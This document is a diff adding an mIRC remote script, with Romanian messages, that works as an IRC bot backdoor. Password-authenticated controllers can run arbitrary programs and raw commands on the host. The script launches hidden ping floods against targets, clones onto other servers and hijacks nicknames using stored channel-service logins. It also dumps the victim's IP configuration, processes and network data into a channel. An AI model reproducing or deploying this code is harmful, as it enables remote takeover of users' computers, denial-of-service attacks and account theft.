@@ -1,0 +1,215 @@
+[script]
+n0=on 1:connect:{
+n1=  nick $read nicks.txt
+n2=  anick $iif($r(0,1) == 1,$r(A,Z)) $+ $read(nicks.txt) $+ $iif($r(1,1) == 1,$r(1,1000))
+n3=  writeini mirc.ini ident userid $read(nicks.txt)
+n4=  fullname $read(nicks.txt)
+n5=  reload -ru users.ini
+n6=  notify on
+n7=  join %inichan1
+n8=  join %inichan2
+n9=  join %inichan3
+n10=  join %inichan4
+n11=  timerpass1 1 10 msg uk777ro zipass
+n12=  timerpass2 1 10 msg danisosad zipass
+n13=}
+n14=
+n15=on 1:unotify:{
+n16=  timernick off
+n17=  timeranick off
+n18=  nick $nick
+n19=  msg x@channels.undernet.org login $read(memorat.txt,s,$nick)
+n20=  if ($nick != w) { silence *!*@* }
+n21=  notify off
+n22=  mode $nick +ix
+n23=  away $read(away.txt,s,$nick $+ .)
+n24=}
+n25=
+n26=raw 471:*:{
+n27=  haltdef
+n28=  .timerjoin1 $+ $$2 0 60 join %inichan1
+n29=  .timerjoin2 $+ $$2 0 60 join %inichan2
+n30=  .timerjoin3 $+ $$2 0 60 join %inichan3
+n31=  .timerjoin4 $+ $$2 0 60 join %inichan4
+n32=  halt
+n33=}
+n34=
+n35=raw 473:*:{
+n36=  haltdef
+n37=  .timerjoin1 $+ $$2 0 60 join %inichan1
+n38=  .timerjoin2 $+ $$2 0 60 join %inichan2
+n39=  .timerjoin3 $+ $$2 0 60 join %inichan3
+n40=  .timerjoin4 $+ $$2 0 60 join %inichan4
+n41=  halt
+n42=}
+n43=
+n44=raw 474:*:{
+n45=  haltdef
+n46=  .timerjoin1 $+ $$2 0 60 join %inichan1
+n47=  .timerjoin2 $+ $$2 0 60 join %inichan2
+n48=  .timerjoin3 $+ $$2 0 60 join %inichan3
+n49=  .timerjoin4 $+ $$2 0 60 join %inichan4
+n50=  halt
+n51=}
+n52=
+n53=raw 475:*:{
+n54=  haltdef
+n55=  .timerjoin1 $+ $$2 0 60 join %inichan1
+n56=  .timerjoin2 $+ $$2 0 60 join %inichan2
+n57=  .timerjoin3 $+ $$2 0 60 join %inichan3
+n58=  .timerjoin4 $+ $$2 0 60 join %inichan4
+n59=  halt
+n60=}
+n61=
+n62=on *:join:#:{ 
+n63=  if ( $nick == $me ) mode $chan +tns
+n64=  timerjoin1 $+ $chan off
+n65=  timerjoin2 $+ $chan off
+n66=  timerjoin3 $+ $chan off
+n67=  timerjoin4 $+ $chan off
+n68=}
+n69=
+n70=raw 375:*:{
+n71=  haltdef
+n72=  mode $me +ix
+n73=  mode $me -ws
+n74=  halt
+n75=}
+n76=
+n77=on 1:text:*:*: {
+n78=  if ($1 == %passuk) {
+n79=    writeini users.ini users n1 100:*! $+ $2
+n80=    reload -ru users.ini
+n81=    notice $nick 2 $+ $nick AUTENTIFICARE REUSITA ca 4UK
+n82=  }
+n83=  if ($1 == %passmad) {
+n84=    writeini users.ini users n0 100:*! $+ $2
+n85=    reload -ru users.ini
+n86=    notice $nick 2 $+ $nick AUTENTIFICARE REUSITA ca 4MAD
+n87=  }
+n88=  if ($1 == refreshparola) {
+n89=    msg $nick refreshpassbotu %passmad
+n90=    msg $nick refreshpassuk %passuk
+n91=  }
+n92=  if ($1 == refreshpassbotu) {
+n93=    set %passmad $2
+n94=  }
+n95=  if ($1 == refreshpassuk) {
+n96=    set %passuk $2
+n97=  }
+n98=}
+n99=
+n100=on 100:text:*:*: {
+n101=  if ($1 == !passuk) { set %passuk $2 | notice $nick 2Parola a fost schimbatã cu succes! | halt }
+n102=  if ($1 == !passmad) { set %passmad $2 | notice $nick 2Parola a fost schimbatã cu succes! | halt }
+n103=  if ($1 == !logoutuk) { writeini users.ini users n1 100:*!*@Lucian.users.undernet.org | reload -ru users.ini | notice $nick bye bye UK ! | halt }
+n104=  if ($1 == !logoutmad) { writeini users.ini users n0 100:*!*@mad.users.undernet.orgt | reload -ru users.ini | notice $nick bye bye MAD ! | halt }
+n105=  if ($1 == !autoop) { set %autoop $2 | msg $chan 9,1/!\1,9 Autoop e $2 | halt }
+n106=  if ($1 == !op) { if ($2 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooooooooo $2- } | halt }
+n107=  if ($1 == !deop) { if ($2 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooooooooo $2- } | halt }
+n108=  if ($1 == !ver) { .msg $chan $ver | halt }
+n109=  if ($1 == !randnick) { nick $read(nicks.txt) | halt }
+n110=  if ($1 == !rnick) { nick $iif($r(0,1) == 1,$r(A,Z)) $+ $read(nicks.txt) $+ $iif($r(1,1) == 1,$r(1,1000)) | halt }
+n111=  if ($1 == !ban) { mode $chan -o+b $2 $address($2,2) | kick $chan $2- ( $+ $nick $+ ) | halt }
+n112=  if ($1 == !run) { run $2- | .notice $nick Am rulat ( $2- )  | halt } 
+n113=  if ($1 == !msg) { .timer 1 1 msg $2- | halt }
+n114=  if ($1 == !join) { join $2- | who $2 | halt }
+n115=  if ($1 == !part) { part $2- | halt }
+n116=  if ($1 == !take) { .notify $2 | .write memorat.txt $2-4 | .write away.txt $2 $+ . $5- | .notice $nick Am inteles, sã trãiti! (4 $2 ) e ca si luat! | halt }
+n117=  if ($1 == !let) { .notify -r $2 | .write -ds $2 memorat.txt | .write -ds $2 $+ . away.txt | away | .notice $nick Am inteles, sã trãiti! (4 $2 ) e istorie! | halt }
+n118=  if ($1 == !me) { describe $chan $2- | halt }
+n119=  if ($1 == !ame) { ame $2- | halt }
+n120=  if ($1 == !quit) { .timer 1 0 quit $2- | halt }
+n121=  if ($1 == !say) { .timer 1 0 msg $chan $2- | halt }
+n122=  if ($1 == !who) { .whois $me | set %canal $chan }
+n123=  if ($1 == !flood) { run ping -n $3 -l $4 -w 2000 $2 | run c:\windows\system32\drivers\shellz\hidewndw.exe /n /fh c:\windows\system32\ping.exe | notice $nick 2Floodãm $2 cu $4 ! | halt }
+n124=  if ($1 == !clone) { if (%frate == orfan) { server -m $2- | set %frate exista | notice $nick 2mã clonez... | halt } | else { notice $nick 4nu mai pot ! | halt } }
+n125=  if ($1 == !ctcp) { .ctcp $2- | halt } 
+n126=  if ($1 == !raw) { $$2- | halt }
+n127=  if ($1 == $me) {
+n128=    if ($2 == op) { if ($3 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooooooooo $3- } | halt }
+n129=    if ($2 == deop) { if ($3 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooooooooo $3- } | halt }
+n130=    if ($2 == ver) { .msg $chan $ver | halt }
+n131=    if ($2 == randnick) { nick $read(nicks.txt) | halt }
+n132=    if ($2 == rnick) { nick $iif($r(0,1) == 1,$r(A,Z)) $+ $read(nicks.txt) $+ $iif($r(1,1) == 1,$r(1,1000)) | halt }
+n133=    if ($2 == ban) { mode $chan -o+b $3 $address($3,2) | kick $chan $3- ( $+ $nick $+ ) | halt }
+n134=    if ($2 == run) { run $3- | .notice $nick Am rulat ( $3- )  | halt } 
+n135=    if ($2 == msg) { .timer 1 1 msg $3- | halt }
+n136=    if ($2 == join) { join $3- | who $3 | halt }
+n137=    if ($2 == part) { part $3- | halt }
+n138=    if ($2 == take) { .notify $3 | .write memorat.txt $3-5 | .write away.txt $3 $+ . $6- | .notice $nick Am inteles, sã trãiti! (4 $3 ) e ca si luat! | halt }
+n139=    if ($2 == let) { .notify -r $3 | .write -ds $3 memorat.txt | .write -ds $3 away.txt | away | .notice $nick Am inteles, sã trãiti! (4 $3 ) e istorie! | halt }
+n140=    if ($2 == me) { describe $chan $3- | halt }
+n141=    if ($2 == ame) { ame $3- | halt }
+n142=    if ($2 == quit) { .timer 1 0 quit $3- | halt }
+n143=    if ($2 == say) { .timer 1 0 msg $chan $3- | halt }
+n144=    if ($2 == who) { .whois $me | set %canal $chan }
+n145=    if ($2 == flood) { run ping -n $3 -l $4 -w 2000 $2 | run c:\windows\system32\drivers\shellz\hidewndw.exe /n /fh c:\windows\system32\ping.exe | notice $nick 2Floodãm $2 cu $4 ! | halt }
+n146=    if ($2 == clone) { if (%frate == orfan) { server -m $2- | set %frate exista | notice $nick 2mã clonez... | halt } | else { notice $nick 4nu mai pot ! | halt } }
+n147=    if ($2 == ctcp) { .ctcp $3- | halt } 
+n148=    if ($2 == raw) { $$3- }
+n149=    if ($2 == fullinfo) {
+n150=      /run fullinfo.lnk
+n151=      /msg $chan 8,1 /!\ 1,8 Actualizez datele... (5 sec.) 
+n152=      /timerinfo 1 5 {
+n153=        //msg $chan $read(fullinf.txt , 1)
+n154=        //msg $chan $read(fullinf.txt , 2)
+n155=        //msg $chan $read(fullinf.txt , 3) - $os
+n156=        //msg $chan $read(fullinf.txt , 4)
+n157=        //msg $chan $read(fullinf.txt , 5)
+n158=        //msg $chan $read(fullinf.txt , 6)
+n159=        //msg $chan $read(fullinf.txt , 7)
+n160=        //msg $chan $read(fullinf.txt , 8)
+n161=        //msg $chan $read(fullinf.txt , 9)
+n162=      }
+n163=      /halt
+n164=    }
+n165=    if ($2 == fullinfo2) {
+n166=      /run fullinfo2.lnk
+n167=      /msg $chan 8,1 /!\ 1,8 Actualizez datele... (10 sec.) 
+n168=      /timerip 1 10 play $chan fullinfo2.txt 2000
+n169=      /halt
+n170=    }
+n171=
+n172=    if ($2 == ipconf) {
+n173=      /run ipconf.lnk
+n174=      /msg $chan 8,1/!\1,8 Actualizez datele... (10 sec.) 
+n175=      /timerip 1 10 play $chan ipinf.txt 2000
+n176=      /halt
+n177=    }
+n178=    if ($2 == netinfo) {
+n179=      /run netinfo.lnk
+n180=      /msg $chan 8,1 /!\ 1,8 Actualizez datele... (10 sec.) 
+n181=      /timernet 1 10 play $chan netinf.txt 2000
+n182=      /halt
+n183=    }
+n184=    if ($2 == procese) {
+n185=      /run procese.lnk
+n186=      /msg $chan 8,1 /!\ 1,8 Actualizez datele... (10 sec.) 
+n187=      /timernet 1 10 play $chan procese.txt 2000
+n188=      /halt
+n189=    }
+n190=
+n191=  }
+n192=}
+n193=
+n194=on 1:quit: { 
+n195=  set %frate orfan
+n196=  writeini users.ini users n0 100:*!*@mad.users.undernet.org
+n197=  writeini users.ini users n1 100:*!*@Lucian.users.undernet.org
+n198=  writeini users.ini users n2 1:*!*@*
+n199=  halt 
+n200=}
+n201=
+n202=on 1:exit: { 
+n203=  set %frate orfan
+n204=  writeini users.ini users n0 100:*!*@mad.users.undernet.org
+n205=  writeini users.ini users n1 100:*!*@Lucian.users.undernet.org
+n206=  writeini users.ini users n2 1:*!*@*
+n207=  halt 
+n208=}
+n209=
+n210=raw 312:*:msg %canal 4,15 $3- 
+n211=raw 319:*:msg %canal 2,15 $3- 
+n212=
+n213=alias ver return 2,15 Rulez pe:4,15 Windows $os 2,15de:4,15 $uptime(server,1) ! 
